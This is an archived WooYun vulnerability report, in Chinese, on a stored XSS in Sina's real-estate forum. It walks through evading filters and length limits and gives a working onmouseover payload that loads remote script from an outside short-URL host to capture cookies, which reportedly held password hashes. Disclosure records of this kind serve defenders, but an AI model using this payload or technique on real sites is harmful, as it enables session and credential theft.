{"id": 40236, "wybug_id": "wooyun-2015-092092", "wybug_title": "新浪地产论坛一处存储型XSS", "wybug_corp": "新浪", "wybug_author": "Forever80s", "wybug_date": "2015-01-16 10:44", "wybug_open_date": "2015-03-02 10:46", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-02：\t细节向公众公开  简要描述： 主要share一下成功插入js的征途 详细说明：  主要share一下成功插入js的征途前言poc地址，鼠标移动到分享处，登陆状态下盲打到cookie里是有密码的md5的alert :\nhttp://bbs.dichan.com/tie-1412-1.html\n加载js ：\nhttp://bbs.dichan.com/tie-2111364-4.html\n\n\n审核请您仔细点1、jQuery.getScript首先由于长度限制，过滤单引号用jQuery.getScript（$对象已经被覆盖了）加载js，js地址用fromCharCode，但是总是多出几个字符。找了好几个shorturl平台，最后找了最短的//ww.tl/_- 刚好能用。出乎意外的是getScript函数会在路径后加上随机数如图，就变成notfound了\n\n测试发现大多数shoturl产生的url用getScript都是not found2、fuzz short url能不能在我的short url //ww.tl/_- 后边加上一个无效字符，利用web语言的一些特性把getScript 后边的随机数?_=1421296220327 截掉呢？fuzz试试\n\n然后输出可以截断的ascii\n\n然后把fromCharCode 最后添加任意一个fuzz出的ascii。但是还是不行，调试窗口网络请求都url编码了。3、哪里还能更短呢？short url以我的资源是不可能更短了那loader 函数呢？能否更短呢？js代码量一定大于jQuery，有没有其他函数呢？内置的把论坛网页保存起来找一下\n\n找到一个loadScript函数，分析一下是替换script标签的，窃喜那么成功构造出一个我水平范围内的最短的\n\"onmouseover=loadscript(\"//ww.tl/_-\",\"scriptpopular\")>\"\n4、触发最大化触发在一个链接上，思路是让链接占满整个横屏，那么浏览帖子的人，一旦滚动范围大就触发如下 图分享处是出发点，占整个宽度的80%\n\n这时候的dom是\n\n盲打到的数据\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 Forever80s@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-01-16 16:20 厂商回复： 感谢关注新浪安全，此为合作方项目，将通知对方修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}